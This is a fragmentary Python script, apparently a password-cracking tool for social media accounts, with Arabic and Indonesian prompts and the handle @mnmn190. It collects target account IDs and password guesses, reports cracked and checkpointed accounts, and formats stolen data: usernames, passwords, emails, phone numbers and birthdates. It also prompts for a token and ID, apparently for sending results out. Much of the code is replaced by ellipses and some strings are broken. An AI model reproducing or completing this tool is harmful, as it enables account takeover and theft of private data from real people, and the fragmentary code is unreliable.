...
if now >=target:exit("وقفت الأدآة دخن لا ضوج 🗿🚬 راسلني حتى افعلها @mnmn190")
...
TLA @mnmn190⠀''')
print()
token=input('''\033[2;32m[👿] \x1b[38;5;209m𝐓𝐨𝐤𝐞𝐧  : \033[2;35m''')
print(('\033[92m—'*25)+'\n KSG @mnmn190\n'+('—'*25))
print()
ID=input('''\033[2;32m[👿] \x1b[38;5;209m𝐈𝐃   : \033[2;35m''')
print(('\033[92m—'*25)+'\n KSG @mnmn190\n'+('—'*25))
os.system('clear')
os.system('clear')
print('                    ')
	...
	try:
		...
		with requests.Session() as rsn:
			try:
				...
				print(f'  {x}[{h}•{x}]{h} GOOD LOGIN{x} ');time.sleep(1)
		exit()
...
'
 ...
 ''')
	...
	print(f''' \033[2;36m⋘━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⋙\033[2;32m┓    
 \033[2;31m┃ \033[2;32m[1]  \x1b[38;5;209m   من ايديات  \03💜
 
 \033[2;31m┃ \033[2;32m[2]  \x1b[38;5;209m   من ملف  💜  \033[2;31 
 \033[2;36m⋘━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⋙\033[2;32m┛''')
	print('')	
	_____alvino__adijaya_____ = input('''   \033[2;32m[💜]  \x1b[38;5;209mاختار  : \033[2;35m''')
...
def file_2():
            try:
                #print('')
                fileX = input (f'\033[2;32m[💜]ادخل ملف الايديات')
...
def yy_1():
	...
	try:
	#	print('')
		jum = int(input('''   \033[2;32m[💜]  \x1b[38;5;209mCRACK  ID : اختر عدد الايدي   \033[2;35m'''))
	except ValueError:
	...
	for met in range(jum):
		...
		yz+=1
		kl = input('   \033[2;32m[💜]  \x1b[38;5;209mID  '+str(yz)+' :\033[2;35m ')
		uid.append(kl)
	for user in uid:
	    try:
	       head = (
	...
	try:
		print(f''''  \033[2;32m[💥]  \x1b[38;5;209mTotal ID : عدد الايديات \033[2;35m'''+str(len(id)))
		time.sleep(2)
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#		method.append('touch')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[green]]  فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
		pwku=input('\033[2;32m[💥]Password:')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s[@mnmn190] %s/%s 💥 [OK] %s 🔥[CP] %s ] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
♚ ☞ @mnmn190 '''
					...
					infoakun += f'''━━━━━━━━━━━━━━━━━━━━━━━━⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\━━━━━━━━━━━━━━━━━━━\❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n
⋘━━━━━━━━━━━━━━━━━━━━━━━⋙
♚ ☞ @mnmn190 '''
